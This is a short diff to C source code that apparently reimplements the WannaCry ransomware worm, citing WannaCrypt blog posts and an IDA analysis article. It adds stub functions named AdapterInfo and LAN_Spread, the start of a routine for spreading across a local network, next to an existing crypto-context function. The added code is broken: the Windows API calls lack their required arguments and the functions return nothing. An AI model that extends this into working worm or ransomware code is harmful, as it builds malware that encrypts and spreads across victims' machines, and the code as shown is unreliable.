@@ -10,6 +10,11 @@
 //https://www.microsoft.com/security/blog/2017/05/12/wannacrypt-ransomware-worm-targets-out-of-date-systems/
 //https://blogs.windows.com/russia/2017/05/17/windows-vs-wannacrypt/
 
+/* massive IDA screenshots & help from article:
+https://www.programmersought.com/article/23574059266/
+*/
+
+
 #include <stdlib.h>
 #include <Windows.h>
 #include <wininet.h>
@@ -17,6 +22,18 @@
 
 //globals
 char executable_path[MAX_PATH]; //Get executable path 
+
+//obtain the network card configuration and IP address details
+int AdapterInfo()
+{
+	GetAdaptersInfo();
+}
+
+int LAN_Spread()
+{
+	LOBYTE();
+	AdapterInfo();
+}
 
 HGLOBAL InitCryptoContext()
 {
